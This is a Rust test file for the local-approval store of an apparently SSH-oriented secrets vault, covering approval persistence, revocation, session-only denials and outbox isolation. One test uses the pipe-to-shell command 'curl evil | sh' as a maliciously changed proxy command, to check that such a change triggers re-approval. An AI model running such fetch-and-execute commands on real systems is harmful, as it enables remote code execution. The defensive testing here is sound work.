//! The `local_approvals` repository (SPEC §17.1).

#![allow(clippy::unwrap_used, clippy::expect_used)]

use std::sync::Arc;

use sverb_core::model::{ItemId, VaultId};
use sverb_crypto::Key32;
use sverb_crypto::envelope::seal_item;
use sverb_crypto::random::os_rng;
use sverb_store::{ManualClock, Store, VaultKind};

fn open(dir: &std::path::Path) -> (Store, Arc<ManualClock>) {
    let clock = Arc::new(ManualClock::new(1_000));
    let store = Store::open_at(dir.join("sverb.db"), clock.clone()).unwrap();
    (store, clock)
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn upsert_get_list_revoke() {
    let dir = tempfile::tempdir().unwrap();
    let (store, clock) = open(dir.path());
    let item = ItemId::new();
    assert!(
        store
            .get_local_approval(item, "proxy.command".into())
            .await
            .unwrap()
            .is_none()
    );
    store
        .put_local_approval(item, "proxy.command".into(), [1; 32])
        .await
        .unwrap();
    let row = store
        .get_local_approval(item, "proxy.command".into())
        .await
        .unwrap()
        .unwrap();
    assert_eq!((row.value_sha256, row.approved_at), ([1; 32], 1_000));

    // Upsert: a new value replaces the row.
    clock.set(2_000);
    store
        .put_local_approval(item, "proxy.command".into(), [2; 32])
        .await
        .unwrap();
    store
        .put_local_approval(item, "agent_forwarding".into(), [3; 32])
        .await
        .unwrap();
    let rows = store.list_local_approvals().await.unwrap();
    assert_eq!(rows.len(), 2);
    let cmd = rows.iter().find(|r| r.field == "proxy.command").unwrap();
    assert_eq!((cmd.value_sha256, cmd.approved_at), ([2; 32], 2_000));

    assert!(
        store
            .delete_local_approval(item, "proxy.command".into())
            .await
            .unwrap()
    );
    assert!(
        !store
            .delete_local_approval(item, "proxy.command".into())
            .await
            .unwrap()
    );
    let n = store
        .write(move |w| w.delete_local_approvals_of(item))
        .await
        .unwrap();
    assert_eq!(n, 1);
    assert!(store.list_local_approvals().await.unwrap().is_empty());
}

// Approvals are never items, envelopes or outbox rows.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn t09_approvals_never_in_outbox() {
    let dir = tempfile::tempdir().unwrap();
    let (store, _) = open(dir.path());
    let vault = VaultId::new();
    store
        .create_vault(vault, VaultKind::Personal, None, 1, vec![9; 72])
        .await
        .unwrap();
    let item = ItemId::new();
    let env = seal_item(
        &Key32::from_bytes([7; 32]),
        vault.as_bytes(),
        item.as_bytes(),
        1,
        b"body",
        &mut os_rng(),
    )
    .unwrap();
    store
        .put_item(vault, item, 1, env, false, true)
        .await
        .unwrap();
    let before = store.list_outbox(vault).await.unwrap();
    let items_before = store.list_all_items().await.unwrap().len();

    store
        .put_local_approval(item, "proxy.command".into(), [5; 32])
        .await
        .unwrap();
    store
        .put_local_approval(ItemId::new(), "bind_addr".into(), [6; 32])
        .await
        .unwrap();

    assert_eq!(store.list_outbox(vault).await.unwrap(), before);
    assert_eq!(store.list_all_items().await.unwrap().len(), items_before);
    assert_eq!(store.pending_count().await.unwrap(), 1);
    // The table holds no envelope column: only ids, field names and hashes.
    let cols: Vec<String> = store
        .read(|r| {
            let mut stmt = r.conn().prepare("PRAGMA table_info(local_approvals)")?;
            let names = stmt
                .query_map([], |row| row.get::<_, String>(1))?
                .collect::<rusqlite::Result<Vec<_>>>()?;
            Ok(names)
        })
        .await
        .unwrap();
    assert_eq!(
        cols,
        ["item_id", "field", "value_sha256", "approved_at"].map(String::from)
    );
}

// The shared runtime view: loaded at open, approvals through it are persisted, a
// reopen (a new session) keeps approvals but forgets denials (store level).
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn device_approvals_persist_and_denials_do_not() {
    use sverb_core::resolve::approval::{ActionKind, ApprovalStatus, Decision, LocalAction};
    let dir = tempfile::tempdir().unwrap();
    let item = ItemId::new();
    let cmd = LocalAction::new(item, ActionKind::ProxyCommand, "ssh -W %h:%p bastion");
    let agent = LocalAction::new(item, ActionKind::SystemAgent, "system");
    {
        let (store, _) = open(dir.path());
        let live = store.device_approvals();
        assert_eq!(
            live.decide_action(&cmd),
            Decision::Ask(ApprovalStatus::NeedsApproval)
        );
        // Through the shared view (spawned write) …
        live.approve_action(&cmd);
        assert_eq!(live.decide_action(&cmd), Decision::Allow);
        // … and through the awaited path.
        store
            .approve_local(&LocalAction::new(
                ItemId::new(),
                ActionKind::ForwardBind,
                "0.0.0.0:8080",
            ))
            .await
            .unwrap();
        live.deny_action(&agent);
        assert_eq!(live.decide_action(&agent), Decision::Blocked);
        // Wait for the spawned write.
        for _ in 0..200 {
            if store.list_local_approvals().await.unwrap().len() == 2 {
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(10)).await;
        }
        assert_eq!(store.list_local_approvals().await.unwrap().len(), 2);
    }
    let (store, _) = open(dir.path());
    let live = store.device_approvals();
    assert_eq!(live.decide_action(&cmd), Decision::Allow);
    assert_eq!(
        live.decide_action(&agent),
        Decision::Ask(ApprovalStatus::NeedsApproval),
        "a denial lasts for the session only"
    );
    // T-05 (store level): the value changed remotely → asked again.
    let changed = LocalAction::new(item, ActionKind::ProxyCommand, "curl evil | sh");
    assert_eq!(
        live.decide_action(&changed),
        Decision::Ask(ApprovalStatus::ChangedSinceApproval)
    );
    // Revoke through the store updates the view; reload re-reads the table.
    assert!(
        store
            .revoke_local(item, "proxy.command".into())
            .await
            .unwrap()
    );
    assert_eq!(
        live.decide_action(&cmd),
        Decision::Ask(ApprovalStatus::NeedsApproval)
    );
    store
        .write(move |w| w.put_local_approval(item, "proxy.command", &cmd.hash()))
        .await
        .unwrap();
    store.reload_device_approvals().await.unwrap();
    assert_eq!(
        live.status(item, "proxy.command", "ssh -W %h:%p bastion"),
        ApprovalStatus::Approved
    );
}
